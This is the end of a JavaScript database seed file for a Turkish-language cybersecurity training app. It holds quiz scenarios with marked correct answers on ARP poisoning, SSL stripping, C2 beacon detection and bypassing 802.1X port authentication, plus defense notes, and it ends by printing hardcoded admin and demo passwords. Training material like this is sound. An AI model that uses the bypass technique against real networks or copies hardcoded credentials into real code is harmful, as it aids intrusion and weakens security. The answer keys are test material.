            { label: "ARP poisoning/spoofing saldırısı: Saldırgan (00:0c:29:aa:bb:cc) gateway IP'sini kendi MAC'iyle eşleştiriyor. Gratuitous ARP flood ile tüm ağın cache'ini zehirliyor. MITM pozisyonu elde ediyor.", correct: true, consequence: "Doğru! Gratuitous ARP (kimse sormadan gönderilen ARP reply) cache poisoning'in klasik yöntemi. Yüksek frekans (0.5s) cache timeout'tan önce yenileme yapıyor. 00:0c:29:xx.xx.xx VMware sanal makine MAC prefix'i - saldırgan VM kullanıyor." },
            { label: "Normal ağ keşif trafiği, tehdit yok", correct: false, consequence: "Yanlış. Normal ARP bu frekansla repeat etmez. Aynı kaynaktan sürekli ARP flood = kesinlikle saldırı veya misconfigured araç." },
            { label: "Gateway arızalı, ARP yanıtı alamıyor", correct: false, consequence: "Yanlış. Gateway arızasında ARP reply gelmez, request tekrarlanır. Ama burada ARP cache zaten yanlış MAC'i gösteriyor - bu saldırı." },
            { label: "Broadcast fırtınası (broadcast storm), ağ tıkanması", correct: false, consequence: "Broadcast storm tüm cihazlardan gelir, tek kaynaktan değil. Bu pattern tek kaynak = hedefli ARP poisoning." }
          ],
          educationNote: "ARP Poisoning Tespiti: Arpwatch, XArp, Wireshark ARP filter. Savunma: Dynamic ARP Inspection (DAI) - Cisco switch özelliği. Static ARP entries kritik sistemler için. 802.1X port authentication.",
          realWorldExample: "2011'de Türkiye'de büyük bir ISP'nin iç ağında ARP poisoning ile milyonlarca kullanıcının trafiği yönlendirildi."
        },
        {
          id: 2,
          title: "SSL Stripping Saldırısı",
          content: `Saldırgan MITM pozisyonunda. Kurban https://bank.com'a gitmek istiyor ama HTTP üzerinden bağlantı kuruyor.

SSL stripping nasıl çalışır ve en etkili savunma nedir?`,
          choices: [
            { label: "Saldırgan kurbanla HTTP, bankayla HTTPS konuşur. Banka→Saldırgan HTTPS, Saldırgan→Kurban HTTP. HSTS (HTTP Strict Transport Security) + HSTS Preload bu saldırıyı engeller.", correct: true, consequence: "Mükemmel! SSLstrip tam olarak bu. Kurban şifrelenmemiş bağlantıda hassas veri gönderir. HSTS: tarayıcı o domain için asla HTTP kabul etmez. HSTS Preload: tarayıcıya önceden yüklenmiş liste, ilk bağlantıda bile HTTPS zorlar." },
            { label: "SSL sertifikası varsa saldırı imkansız", correct: false, consequence: "Yanlış. SSL stripping SSL'i kaldırır - sertifika kurban tarafında hiç görünmez. Kurban zaten HTTP bağlantı kuruyor, sertifika uyarısı olmaz." },
            { label: "HTTPS kullanmak tek başına yeterli savunmadır", correct: false, consequence: "Yanlış. HTTPS sunucuda olsa bile kullanıcı HTTP ile başlıyorsa strip saldırısı mümkün. HSTS ile tarayıcı seviyesinde zorunluluk gerekir." },
            { label: "VPN kullanmak SSL stripping'i engeller", correct: false, consequence: "Kısmi doğru. VPN trafiği şifreler ama VPN kendi içinde MITM'e karşı savunmasız olabilir. HSTS daha spesifik ve güvenilir çözüm." }
          ],
          educationNote: "HSTS Implementasyonu: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload header'ı ekle. hstspreload.org'a submit et. Certificate Transparency logs ile sertifika izle.",
          realWorldExample: "2009'da Moxie Marlinspike SSLstrip'i Black Hat'te sundu. Hala milyonlarca HTTP redirect sitesi bu saldırıya karşı savunmasız."
        },
        {
          id: 3,
          title: "Wireshark Trafik Analizi",
          content: `Wireshark'ta şüpheli trafik yakaladınız:

192.168.1.105 → 185.220.101.47:443  [TLS 1.2]
- Bağlantı süresi: 47 gün kesintisiz
- Veri gönderme: Her 60 saniyede tam 128 byte
- Beacon interval: ±2 saniye jitter
- User-Agent: Mozilla/5.0 (Windows NT 10.0)

Bu trafik hakkında en doğru analiz hangisidir?`,
          choices: [
            { label: "C2 beacon trafiği: 60s interval + 128 byte fixed size + Tor exit node IP + 47 gün persistence = RAT/backdoor. Jitter anti-detection için ekleniyor.", correct: true, consequence: "Mükemmel analiz! Beacon karakteristikleri: sabit interval + sabit boyut + long-term persistence. Jitter (±2s) network anomaly detection'ı atlatmak için. 185.220.101.47 Tor exit node = saldırgan gerçek IP'sini gizliyor. 47 gün = dwell time çok yüksek, APT indicator." },
            { label: "Normal HTTPS web trafiği, şüpheli bir şey yok", correct: false, consequence: "Yanlış. Normal web trafiği bu kadar düzenli aralıklı olmaz. Sabit 128 byte her 60 saniye = heartbeat/beacon. Tor IP ek kırmızı bayrak." },
            { label: "Antivirus güncellemesi olabilir, normal scheduled task", correct: false, consequence: "AV güncellemeleri Tor exit node'larına bağlanmaz ve bu kadar küçük sabit paket göndermez. Traffic pattern çok spesifik." },
            { label: "TLS 1.2 kullandığı için şifreli, analiz yapılamaz", correct: false, consequence: "Yanlış. TLS içeriği şifreli olsa da metadata (IP, port, timing, size, frequency) analiz edilebilir. JA3 fingerprint ile TLS client profili çıkarılabilir." }
          ],
          educationNote: "C2 Tespiti: Zeek/Bro ile beacon analizi, Rita (Real Intelligence Threat Analytics) otomatik C2 detection. JA3/JA3S TLS fingerprinting. MITRE ATT&CK T1071 (Application Layer Protocol) T1573 (Encrypted Channel).",
          realWorldExample: "APT29 (Cozy Bear) tam olarak bu beacon pattern kullandı. SolarWinds saldırısında C2 trafiği 9 ay fark edilmedi."
        },
        {
          id: 4,
          title: "802.1X Port Authentication",
          content: `Bir şirket ağında fiziksel erişim sağladınız. Switch portuna laptop bağladınız ama IP alamıyorsunuz.

Ağ 802.1X EAP-TLS kullanıyor. Hangi teknik bu engeli aşabilir?`,
          choices: [
            { label: "Fiziksel olarak bağlı olan meşru bir cihazın arkasına hub/switch koy (MAC spoofing + VLAN hopping değil, transparent bridging)", correct: true, consequence: "Doğru! 802.1X cihaz bazlı auth yapar, port bazlı değil. Authenticated cihazın trafiğini transparent bridge ederek o portun 'authorized' durumunu kullanabilirsiniz. Savunma: Multi-host mode yerine single-host mode + MAB (MAC Authentication Bypass) + RADIUS." },
            { label: "MAC adresini değiştirmek 802.1X'i bypass eder", correct: false, consequence: "Yanlış. 802.1X EAP-TLS sertifika tabanlı auth yapar, sadece MAC adresine bakmaz. MAC spoofing MAB (MAC Auth Bypass) olan ağlarda işe yarar ama EAP-TLS'e karşı etkisiz." },
            { label: "VLAN hopping ile authentication atlanır", correct: false, consequence: "Yanlış. VLAN hopping ayrı bir teknik (double tagging). 802.1X port authentication'ı bypass etmez, farklı VLAN'a erişim sağlar." },
            { label: "802.1X bypass imkansız, fiziksel güvenlik yeterli", correct: false, consequence: "Yanlış. Hiçbir güvenlik kontrolü mutlak değil. Transparent bridging dışında rogue AP ekleme, RADIUS server attack gibi teknikler de mevcut." }
          ],
          educationNote: "802.1X Güçlendirme: Single-host mode (port başına 1 cihaz), MACsec (802.1AE) ile Layer 2 şifreleme, NAC (Network Access Control) çözümleri: Cisco ISE, Aruba ClearPass. Fiziksel port güvenliği + kamera kombinasyonu.",
          realWorldExample: "2012 Defcon'da araştırmacılar 802.1X bypass tekniklerini sundu. Kurumsal ağların büyük çoğunluğu hala savunmasız."
        }
      ])
    }
  ];

  for (const scenario of scenarios) {
    await prisma.scenario.upsert({
      where: { slug: scenario.slug },
      update: { steps: scenario.steps, description: scenario.description },
      create: scenario,
    });
  }

  console.log("✅ Database seeded with advanced technical scenarios!");
  console.log("👤 Admin: admin@cyberguard.dev / Admin@CyberGuard2024!");
  console.log("👤 Demo:  demo@cyberguard.dev  / Demo@CyberGuard2024!");
}

main().catch(console.error).finally(() => prisma.$disconnect());